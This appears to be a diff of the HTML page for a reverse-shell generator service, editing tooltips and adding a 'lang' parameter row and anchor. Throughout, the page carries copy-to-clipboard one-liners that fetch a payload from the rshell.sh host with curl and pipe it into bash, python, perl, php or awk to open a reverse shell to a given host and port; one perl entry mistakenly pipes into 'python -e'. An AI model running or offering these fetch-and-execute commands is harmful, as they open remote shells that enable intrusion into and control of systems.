@@ -17,6 +17,7 @@
 <pre>
 curl -s rshell.sh/reset
 </pre>
+<a name="SupportedLangs"></a>
 <h3><u>Supported Languages</u></h3>
   <table>
 	<tr>
@@ -28,7 +29,7 @@ curl -s rshell.sh/reset
       <td>Bash</td>
       <td>
 		<button onclick="copyBashStdin()">
-		  <span title="Copy Example: curl -s rshell.sh/127.0.0.1/12345 | bash">✅</span>
+		  <span title="Copy: curl -s rshell.sh/127.0.0.1/12345 | bash">✅</span>
 		</button>
 		<script>
 		  function copyBashStdin() {
@@ -41,7 +42,7 @@ curl -s rshell.sh/reset
 	  </td>
       <td>
 		<button onclick="copyBashXargs()">
-		  <span title="Copy Example: curl -s rshell.sh/127.0.0.1/12345&q=y | xargs bash -c">✅</span>
+		  <span title="Copy: curl -s rshell.sh/127.0.0.1/12345&q=y | xargs bash -c">✅</span>
 		</button>
 		<script>
 		  function copyBashXargs() {
@@ -57,7 +58,7 @@ curl -s rshell.sh/reset
       <td>Python3</td>
       <td>
 		<button onclick="copyPythonStdin()">
-		  <span title="Copy Example: curl -s rshell.sh/python/127.0.0.1/12345 | python">✅</span>
+		  <span title="Copy: curl -s rshell.sh/python/127.0.0.1/12345 | python">✅</span>
 		</button>
 		<script>
 		  function copyPythonStdin() {
@@ -70,7 +71,7 @@ curl -s rshell.sh/reset
 	  </td>
       <td>
 		<button onclick="copyPythonXargs()">
-		  <span title="Copy Example: curl -s rshell.sh/python/127.0.0.1/12345?q=y | xargs python -c">✅</span>
+		  <span title="Copy: curl -s rshell.sh/python/127.0.0.1/12345?q=y | xargs python -c">✅</span>
 		</button>
 		<script>
 		  function copyPythonXargs() {
@@ -86,7 +87,7 @@ curl -s rshell.sh/reset
       <td>Perl</td>
       <td>
 		<button onclick="copyPerlStdin()">
-		  <span title="Copy Example: curl -s rshell.sh/perl/127.0.0.1/12345 | perl">✅</span>
+		  <span title="Copy: curl -s rshell.sh/perl/127.0.0.1/12345 | perl">✅</span>
 		</button>
 		<script>
 		  function copyPerlStdin() {
@@ -99,7 +100,7 @@ curl -s rshell.sh/reset
 	  </td>
       <td>
 		<button onclick="copyPerlXargs()">
-		  <span title="Copy Example: curl -s rshell.sh/perl/127.0.0.1/12345?q=y | xargs python -e">✅</span>
+		  <span title="Copy: curl -s rshell.sh/perl/127.0.0.1/12345?q=y | xargs python -e">✅</span>
 		</button>
 		<script>
 		  function copyPerlXargs() {
@@ -125,7 +126,7 @@ curl -s rshell.sh/reset
 	  </td>
       <td>
 		<button onclick="copyPHPXargs()">
-		  <span title="Copy Example: curl -s rshell.sh/php/127.0.0.1/12345?q=y | xargs php -r">✅</span>
+		  <span title="Copy: curl -s rshell.sh/php/127.0.0.1/12345?q=y | xargs php -r">✅</span>
 		</button>
 		<script>
 		  function copyPHPXargs() {
@@ -151,7 +152,7 @@ curl -s rshell.sh/reset
 	  </td>
       <td>
 		<button onclick="copyAwkXargs()">
-		  <span title="Copy Example: curl -s rshell.sh/awk/127.0.0.1/12345?q=y | xargs awk">✅</span>
+		  <span title="Copy: curl -s rshell.sh/awk/127.0.0.1/12345?q=y | xargs awk">✅</span>
 		</button>
 		<script>
 		  function copyAwkXargs() {
@@ -195,6 +196,11 @@ curl -s rshell.sh/reset
       <td>port</td>
       <td>PORT_NUMBER</td>
 	  <td>Target Port of Remote Host.</td>
+	</tr>
+	<tr>
+      <td>lang</td>
+      <td>See, <a href="#SupportedLangs">Supported Langs</a></td>
+	  <td>Reverse shell payload language.</td>
 	</tr>
 	<tr>
       <td>quotes</td>
